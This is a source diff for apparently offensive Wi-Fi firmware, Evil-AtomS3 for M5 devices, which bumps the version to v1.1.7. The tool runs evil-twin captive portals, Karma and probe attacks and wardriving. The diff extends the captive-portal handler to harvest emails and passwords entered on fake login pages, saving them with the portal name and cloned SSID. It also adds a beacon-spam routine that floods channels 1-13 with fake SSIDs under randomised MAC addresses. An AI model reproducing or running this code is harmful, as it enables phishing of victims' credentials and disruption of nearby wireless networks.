@@ -57,7 +57,7 @@ const byte DNS_PORT = 53;
 
 int currentIndex = 0, lastIndex = -1;
 bool inMenu = true;
-const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Credentials", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving"};
+const char* menuItems[] = {"Scan WiFi", "Select Network", "Clone & Details" , "Start Captive Portal", "Stop Captive Portal" , "Change Portal", "Check Credentials", "Delete All Creds", "Monitor Status", "Probe Attack", "Probe Sniffing", "Karma Attack", "Karma Auto", "Karma Spear", "Select Probe", "Delete Probe", "Delete All Probes", "Brightness", "Wardriving", "Beacon Spam"};
 const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
 
 const int maxMenuDisplay = 10;
@@ -67,7 +67,7 @@ String ssidList[100];
 int numSsid = 0;
 bool isOperationInProgress = false;
 int currentListIndex = 0;
-String clonedSSID = "Evil-M5Core2";  
+String clonedSSID = "Evil-AtomS3";  
 int topVisibleIndex = 0; 
 
 // Connect to nearby wifi network automaticaly ro provide internet to the core2 you can be connected and provide AP at same time 
@@ -176,6 +176,7 @@ void setColorRange(int startPixel, int endPixel, uint32_t color) {
 #define SCK  7
 #define MISO 8
 #define MOSI 6
+
 // end sd
 
 
@@ -192,89 +193,89 @@ void setup() {
   M5.Display.setTextFont(1);
 
   const char* startUpMessages[] = {
-    "There is no spoon...",
-    "Hack the Planet!",
-    "Accessing Mainframe...",
-    "Cracking Codes...",
+        "  There is no spoon...",
+    "    Hack the Planet!",
+    " Accessing Mainframe...",
+    "    Cracking Codes...",
     "Decrypting Messages...",
     "Infiltrating the Network.",
-    "Bypassing Firewalls...",
+    " Bypassing Firewalls...",
     "Exploring the Deep Web...",
     "Launching Cyber Attack...",
-    "Running Stealth Mode...",
-    "Gathering Intel...",
-    "Shara Conord?",
-    "Breaking Encryption...",
+    " Running Stealth Mode...",
+    "   Gathering Intel...",
+    "     Shara Conord?",
+    " Breaking Encryption...",
     "Anonymous Mode Activated.",
-    "Cyber Breach Detected.",
+    " Cyber Breach Detected.",
     "Initiating Protocol 47...",
-    "The Gibson is in Sight.",
-    "Running the Matrix...",
+    " The Gibson is in Sight.",
+    "  Running the Matrix...",
     "Neural Networks Syncing..",
     "Quantum Algorithm started",
     "Digital Footprint Erased.",
-    "Uploading Virus...",
+    "   Uploading Virus...",
     "Downloading Internet...",
-    "Root Access Granted.",
+    "  Root Access Granted.",
     "Cyberpunk Mode: Engaged.",
-    "Zero Days Exploited.",
+    "  Zero Days Exploited.",
     "Retro Hacking Activated.",
-    "Firewall: Deactivated.",
+    " Firewall: Deactivated.",
     "Riding the Light Cycle...",
-    "Engaging Warp Drive...",
-    "Hacking the Holodeck..",
-    "Tracing the Nexus-6...",
+    "  Engaging Warp Drive...",
+    "  Hacking the Holodeck..",
+    "  Tracing the Nexus-6...",
     "Charging at 2,21 GigaWatt",
-    "Loading Batcomputer...",
-    "Accessing StarkNet...",
-    "Dialing on Stargate...",
-    "Activating Skynet...",
-    "Unleashing the Kraken..",
-    "Accessing Mainframe...",
-    "Booting HAL 9000...",
-    "Death Star loading ...",
-    "Initiating Tesseract...",
-    "Decrypting Voynich...",
-    "Hacking the Gibson...",
-    "Orbiting Planet X...",
-    "Accessing SHIELD DB...",
-    "Crossing Event Horizon.",
-    "Dive in the RabbitHole.",
-    "Rigging the Tardis...",
-    "Sneaking into Mordor...",
+    "  Loading Batcomputer...",
+    "  Accessing StarkNet...",
+    "  Dialing on Stargate...",
+    "   Activating Skynet...",
+    " Unleashing the Kraken..",
+    " Accessing Mainframe...",
+    "   Booting HAL 9000...",
+    " Death Star loading ...",
+    " Initiating Tesseract...",
+    "  Decrypting Voynich...",
+    "   Hacking the Gibson...",
+    "   Orbiting Planet X...",
+    "  Accessing SHIELD DB...",
+    " Crossing Event Horizon.",
+    " Dive in the RabbitHole.",
+    "   Rigging the Tardis...",
+    " Sneaking into Mordor...",
     "Manipulating the Force...",
     "Decrypting the Enigma...",
     "Jacking into Cybertron..",
-    "Casting a Shadowrun...",
-    "Navigating the Grid...",
-    "Surfing the Dark Web...",
-    "Engaging Hyperdrive...",
-    "Overclocking the AI...",
-    "Bending Reality...",
-    "Scanning the Horizon...",
-    "Decrypting the Code...",
+    "  Casting a Shadowrun...",
+    "  Navigating the Grid...",
+    " Surfing the Dark Web...",
+    "  Engaging Hyperdrive...",
+    " Overclocking the AI...",
+    "   Bending Reality...",
+    " Scanning the Horizon...",
+    " Decrypting the Code...",
     "Solving the Labyrinth...",
-    "Escaping the Matrix...",
-    "You know I-Am-Jakoby ?",
+    "  Escaping the Matrix...",
+    " You know I-Am-Jakoby ?",
     "You know TalkingSasquach?",
     "Redirecting your bandwidth for Leska WiFi...", // Donation on Ko-fi // Thx Leska !
-    "  42  ",
-    "Don't be a Skidz !",
-    "Hack,Eat,Sleep,Repeat",
-    "You know Samxplogs ?",
-    "For educational purpose",
+    "           42           ",
+    "    Don't be a Skidz !",
+    "  Hack,Eat,Sleep,Repeat",
+    "   You know Samxplogs ?",
+    " For educational purpose",
     "Time to learn something",
     "U Like Karma? Check Mana",
-    "42 because Universe ",
+    "   42 because Universe ",
     "Navigating the Cosmos...",
     "Unlocking Stellar Secrets",
     "Galactic Journeys Await..",
     "Exploring Unknown Worlds.",
-    "Charting Star Paths...",
-    "Accessing zone 51... ",
+    "   Charting Star Paths...",
+    "   Accessing zone 51... ",
     "Downloading NASA server..",
-    "You know Pwnagotchi ?",
-    "You know FlipperZero?",
+    "   You know Pwnagotchi ?",
+    "   You know FlipperZero?",
     "You know Hash-Monster ?",
     "Synergizing Neuromancer..",
     "Warping Through Cyberspac",
@@ -286,13 +287,13 @@ void setup() {
     "Disrupting the Mainframe.",
     "Melding Minds w Machines.",
     "Bending the Digital Rules",
-    "Hack The Planet !!!",
+    "   Hack The Planet !!!",
     "Tapping into the Ether...",
     "Writing the Matrix Code..",
     "Sailing the Cyber Seas...",
-    "Reviving Lost Codes...",
-    "HACK THE PLANET !!!",
-    "Dissecting DNA of Data",
+    "  Reviving Lost Codes...",
+    "   HACK THE PLANET !!!",
+    " Dissecting DNA of Data",
     "Decrypting the Multiverse",
     "Inverting Reality Matrice",
     "Conjuring Cyber Spells...",
@@ -303,27 +304,28 @@ void setup() {
     "Disarming Digital Dragons",
     "Casting Code Conjurations",
     "Unlocking the Ether-Net..",
-    "Show me what you got !!!",
-    "Do you have good Karma ?",
+    " Show me what you got !!!",
+    " Do you have good Karma ?",
     "Waves under surveillance!", 
-    "Shaking champagne…",
-    "Warping with Rick & Morty.",
-    "Pickle Rick !!!",
+    "    Shaking champagne…",
+    "Warping with Rick & Morty",
+    "       Pickle Rick !!!",
     "Navigating the Multiverse",
-    "Szechuan Sauce Quest.",
-    "Morty's Mind Blowers.",
-    "Ricksy Business Afoot.",
-    "Portal Gun Escapades.",
-    "Meeseeks Mayhem.",
-    "Schwifty Shenanigans.",
-    "Dimension C-137 Chaos.",
+    "   Szechuan Sauce Quest.",
+    "   Morty's Mind Blowers.",
+    "   Ricksy Business Afoot.",
+    "   Portal Gun Escapades.",
+    "     Meeseeks Mayhem.",
+    "   Schwifty Shenanigans.",
+    "  Dimension C-137 Chaos.",
     "Cartman's Schemes Unfold.",
-    "Stan and Kyle's Adventures",
-    "Mysterion Rises Again.",
-    "Towelie's High Times.",
-    "Butters Awkward Escapades.",
-    "Navigating the Multiverse.",
-    "Affirmative Dave,\n    I read you.",
+    "Stan and Kyle's Adventure",
+    "   Mysterion Rises Again.",
+    "   Towelie's High Times.",
+    "Butters Awkward Escapades",
+    "Navigating the Multiverse",
+    "    Affirmative Dave,\n        I read you.",
+    "  Your Evil-M5Core2 have\n     died of dysentery",
   };
   const int numMessages = sizeof(startUpMessages) / sizeof(startUpMessages[0]);
 
@@ -400,7 +402,7 @@ if (batteryLevel < 15) {
   M5.Display.setCursor(18, textY + 20);
   M5.Display.println("By 7h30th3r0n3");
   M5.Display.setCursor(28, textY + 45);
-  M5.Display.println("v1.1.6 2024");
+  M5.Display.println("v1.1.7 2024");
   Serial.println("By 7h30th3r0n3");
   Serial.println("-------------------"); 
   M5.Display.setCursor(0, textY + 80);
@@ -608,6 +610,9 @@ void executeMenuItem(int index) {
       break;    
     case 18: 
       wardrivingMode();
+      break;
+    case 19: 
+      beaconAttack();
       break;
   }
   isOperationInProgress = false;
@@ -1199,20 +1204,20 @@ void createCaptivePortal() {
 
     dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
     isCaptivePortalOn = true;
-
     server.on("/", HTTP_GET, []() {
-        String email = server.arg("email");
-        String password = server.arg("password");
-        if (!email.isEmpty() && !password.isEmpty()) {
-            saveCredentials(email, password);
-            server.send(200, "text/plain", "Credentials Saved");
-        } else {
-            Serial.println("-------------------");
-            Serial.println("Direct Web Access !!!");
-            Serial.println("-------------------");
-            servePortalFile(selectedPortalFile);
-        }
-    });
+            String email = server.arg("email");
+            String password = server.arg("password");
+            if (!email.isEmpty() && !password.isEmpty()) {
+                saveCredentials(email, password, selectedPortalFile.substring(7), clonedSSID); // Assurez-vous d'utiliser les bons noms de variables
+                server.send(200, "text/plain", "Credentials Saved");
+            } else {
+                Serial.println("-------------------");
+                Serial.println("Direct Web Access !!!");
+                Serial.println("-------------------");
+                servePortalFile(selectedPortalFile);
+            }
+        });
+
 
 
     server.on("/evil-m5core2-menu", HTTP_GET, []() {
@@ -1628,20 +1633,28 @@ void servePortalFile(const String& filename) {
     }
 }
 
-void saveCredentials(const String& email, const String& password) {
+void saveCredentials(const String& email, const String& password, const String& portalName, const String& clonedSSID) {
     File file = SD.open("/credentials.txt", FILE_APPEND);
     if (file) {
-        file.println("Email:" + email);
-        file.println("Password:" + password);
-        file.println("----------------------");
+        file.println("-- Email -- \n" + email);
+        file.println("-- Password -- \n" + password);
+        file.println("-- Portal -- \n" + portalName); // Ajout du nom du portail
+        file.println("-- SSID -- \n" + clonedSSID); // Ajout du SSID cloné
+        file.println("------------------");
         file.close();
         Serial.println("-------------------");
         Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
+        Serial.println("On Portal Name: " + portalName);
+        Serial.println("With Cloned SSID: " + clonedSSID); 
         Serial.println("-------------------");
     } else {
         Serial.println("Error opening file for writing");
     }
 }
+
+
+
+
 void stopCaptivePortal() {
   dnsServer.stop();
   server.stop();
@@ -1855,8 +1868,7 @@ void checkCredentials() {
     if (numCredentials == 0) {
         M5.Display.clear();
         M5.Display.setTextSize(1); // Taille de texte réduite pour l'écran 128x128
-        M5.Display.setCursor(20, 20);
-        M5.Display.println("No credentials...");
+        waitAndReturnToMenu("No credentials...");
     } else {
         const int lineHeight = 15; // Hauteur de ligne ajustée pour l'écran 128x128
         const int maxLineLength = 18; // Longueur de ligne maximale adaptée à l'écran 128x128
@@ -2547,8 +2559,8 @@ void saveSSIDToFile(const char* ssid) {
 
   
 void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
-    const int maxLength = 18; 
-    char truncatedSSID[19]; 
+    const int maxLength = 17; 
+    char truncatedSSID[18]; 
 
     M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 30, TFT_BLACK);
     int startIndexKarma = max(0, count - maxMenuDisplay);
@@ -2566,19 +2578,19 @@ void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
         }
     }
    if ( count <= 9){
-    M5.Display.fillRect(M5.Display.width() - 15, 0, 15, 20, TFT_DARKGREEN);
-    M5.Display.setCursor(M5.Display.width() - 13, 3);
+    M5.Display.fillRect(M5.Display.width() - 15/2, 0, 15/2, 15, TFT_DARKGREEN);
+    M5.Display.setCursor(M5.Display.width() - 13/2, 3);
    }else if ( count >= 10 && count <= 99){
-    M5.Display.fillRect(M5.Display.width() - 30, 0, 30, 20, TFT_DARKGREEN);
-    M5.Display.setCursor(M5.Display.width() - 27, 3);
+    M5.Display.fillRect(M5.Display.width() - 30/2, 0, 30/2, 15, TFT_DARKGREEN);
+    M5.Display.setCursor(M5.Display.width() - 27/2, 3);
    }else if ( count >= 100 && count < MAX_SSIDS_Karma*0.7){
-    M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_ORANGE);
+    M5.Display.fillRect(M5.Display.width() - 45/2, 0, 45/2, 15, TFT_ORANGE);
      M5.Display.setTextColor(TFT_BLACK);
-    M5.Display.setCursor(M5.Display.width() - 42, 3);
+    M5.Display.setCursor(M5.Display.width() - 42/2, 3);
      M5.Display.setTextColor(TFT_WHITE);
    }else{
-    M5.Display.fillRect(M5.Display.width() - 45, 0, 45, 20, TFT_RED);
-    M5.Display.setCursor(M5.Display.width() - 42, 3);
+    M5.Display.fillRect(M5.Display.width() - 45/2, 0, 45/2, 15, TFT_RED);
+    M5.Display.setCursor(M5.Display.width() - 42/2, 3);
     }
     if (count == MAX_SSIDS_Karma){
     M5.Display.printf("MAX");
@@ -3701,9 +3713,9 @@ void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPD
 
 String createPreHeader() {
     String preHeader = "WigleWifi-1.4";
-    preHeader += ",appRelease=v1.1.6"; // Remplacez [version] par la version de votre application
+    preHeader += ",appRelease=v1.1.7"; // Remplacez [version] par la version de votre application
     preHeader += ",model=AtonS3";
-    preHeader += ",release=v1.1.6"; // Remplacez [release] par la version de l'OS de l'appareil
+    preHeader += ",release=v1.1.7"; // Remplacez [release] par la version de l'OS de l'appareil
     preHeader += ",device=Evil-AtomS3"; // Remplacez [device name] par un nom de périphérique, si souhaité
     preHeader += ",display=7h30th3r0n3"; // Ajoutez les caractéristiques d'affichage, si pertinent
     preHeader += ",board=M5AtomS3"; 
@@ -3851,6 +3863,10 @@ void wardrivingMode() {
             delay(1000);
             M5.Display.setTextSize(1);
             if (confirmPopup("List Open Networks?")) {
+                M5.Lcd.fillScreen(TFT_BLACK); 
+                M5.Display.setCursor(0, M5.Display.height() / 2);
+                M5.Display.println("Saving Open Networks");
+                M5.Display.println("  Please wait..."); 
                 createKarmaList(maxIndex);
             }
             waitAndReturnToMenu("Stopping Wardriving.");
@@ -3997,5 +4013,116 @@ void karmaSpear() {
     karmaListFile.close();
     isAutoKarmaActive = false;
      Serial.println("Karma Spear Failed...");
-    waitAndReturnToMenu(" Karma Spear Failed...");
+    waitAndReturnToMenu("Karma Spear Failed...");
+}
+
+
+std::vector<String> readCustomBeacons(const char* filename) {
+    File file = SD.open(filename, FILE_READ);
+    std::vector<String> customBeacons;
+
+    if (!file) {
+        Serial.println("Failed to open file for reading");
+        return customBeacons;
+    }
+
+    while (file.available()) {
+        String line = file.readStringUntil('\n');
+        if (line.startsWith("CustomBeacons=")) {
+            String beaconsStr = line.substring(String("CustomBeacons=").length());
+            int idx = 0;
+            while ((idx = beaconsStr.indexOf(',')) != -1) {
+                customBeacons.push_back(beaconsStr.substring(0, idx));
+                beaconsStr = beaconsStr.substring(idx + 1);
+            }
+            if (beaconsStr.length() > 0) {
+                customBeacons.push_back(beaconsStr); // Ajouter le dernier élément
+            }
+            break;
+        }
+    }
+    file.close();
+    return customBeacons;
+}
+
+void beaconAttack() {
+    WiFi.mode(WIFI_MODE_AP);
+
+    // Demander à l'utilisateur s'il souhaite utiliser des beacons personnalisés
+    bool useCustomBeacons = confirmPopup("Use custom beacons?");
+    M5.Display.clear();
+    
+    std::vector<String> customBeacons;
+    if (useCustomBeacons) {
+        customBeacons = readCustomBeacons("/config/config.txt"); // Remplacer par le chemin réel
+    }
+
+    int beaconCount = 0;
+    unsigned long previousMillis = 0;
+    int delayTimeBeacon = 0; // Délai entre les beacons
+    const int debounceDelay = 0; 
+    unsigned long lastDebounceTime = 0;
+    
+    M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
+    M5.Display.setCursor(50, M5.Display.height() - 20);
+    M5.Display.setTextColor(TFT_WHITE);
+    M5.Display.println("Stop");
+
+    int beaconTextX = 5;
+    String beaconText = "Beacon Spam running";
+    M5.Display.setCursor(beaconTextX, 18);
+    M5.Display.println(beaconText);
+    beaconText = "Beacon sent:" ;
+    M5.Display.setCursor(beaconTextX, 27);
+    M5.Display.print(beaconText);
+    Serial.println("-------------------");
+    Serial.println("Starting Beacon Spam");
+    Serial.println("-------------------");
+
+while (!M5.BtnA.isPressed()) {
+    unsigned long currentMillis = millis();
+    if (currentMillis - previousMillis >= delayTimeBeacon) {
+        previousMillis = currentMillis;
+        // Générer un nouveau SSID pour le beacon
+        String ssid;
+        if (!customBeacons.empty()) {
+            ssid = customBeacons[beaconCount % customBeacons.size()]; // Utiliser un beacon personnalisé
+        } else {
+            ssid = generateRandomSSID(32); // Utiliser un beacon aléatoire
+        }
+
+        // Effacer la zone d'affichage précédente de l'SSID
+        int x = 0; 
+        int y = 45; 
+        M5.Display.setTextColor(TFT_WHITE,TFT_BLACK);
+        // Réécrire le nouvel SSID
+        M5.Display.setCursor(x, y);
+        M5.Display.print(ssid);
+            M5.Display.setTextColor(TFT_WHITE);
+        WiFi.softAP(ssid.c_str());
+        delay(50);
+        for (int channel = 1; channel <= 13; ++channel) {
+            setRandomMAC_APKarma();
+            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+            delay(150);
+          if (M5.BtnA.isPressed()) {
+            break;
+          }
+        }
+        delay(50);
+
+        beaconCount++;
+        }
+
+       M5.update();
+      if (M5.BtnB.isPressed() && currentMillis - lastDebounceTime > debounceDelay) {
+          break;
+      }
+        delay(10);
+    }
+      Serial.println("-------------------");
+      Serial.println("Stopping beacon Spam");
+      Serial.println("-------------------");
+      restoreOriginalWiFiSettings();
+      waitAndReturnToMenu("Beacon Spam Stopped..");
 }
